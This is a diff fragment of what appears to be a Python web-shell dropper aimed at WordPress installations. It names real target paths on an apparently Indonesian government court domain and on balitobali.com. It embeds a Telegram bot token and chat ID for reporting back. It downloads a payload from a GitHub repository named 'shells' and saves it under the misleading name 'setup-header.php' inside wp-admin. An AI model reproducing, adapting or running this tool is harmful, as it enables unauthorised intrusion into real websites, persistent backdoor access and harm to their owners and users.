@@ -12,7 +12,7 @@ from urllib.parse import urlparse
 TELEGRAM_TOKEN = "5889811852:AAFYXZvbsxZSdFd7r6nxLUOsNPLcpMp8XhA"
 TELEGRAM_CHAT_ID = "5673963782"
 
-WEB_ROOT = "/home/ptunm230/public_html/ptun-makassar.go.id/wp-admin"  # sudah sesuai config kamu
+WEB_ROOT = "/home/balitrip/balitobali.com/wp-admin/user"  # sudah sesuai config kamu
 
 FILES = {
     "setup-header.php": "https://raw.githubusercontent.com/zero-arch1337/shells/refs/heads/main/zerominfo.txt",
